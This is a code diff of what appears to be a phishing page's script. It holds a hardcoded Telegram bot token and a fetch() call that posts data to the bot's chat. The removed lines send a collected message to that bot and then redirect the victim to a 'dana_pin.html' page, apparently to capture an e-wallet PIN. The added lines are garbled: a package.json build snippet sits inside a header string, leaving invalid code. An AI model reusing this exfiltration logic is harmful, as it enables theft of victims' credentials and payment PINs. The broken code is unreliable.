@@ -144,15 +144,9 @@ var token_botTele = "7125107461:AAH66Cs4ypTD0Nn-1ouEQwQoqQp37JLkuMI";
     fetch("https://api.telegram.org/bot7125107461:AAH66Cs4ypTD0Nn-1ouEQwQoqQp37JLkuMI/sendMessage?chat_id=6693425460&text=Halo%0Ajuga&parse_mode=html",{
         method: 'POST',
         headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-        },body: JSON.stringify({
-            chat_id: id_telegram,
-            text: message
-        })
-    });
-    window.location.href = "./dana_pin.html";
-}
-</script>
- </body>
-</html>
+            'Accept': '{
+  "scripts": {
+    "build": "[my-framework] build --output public"
+  }
+}',
+     
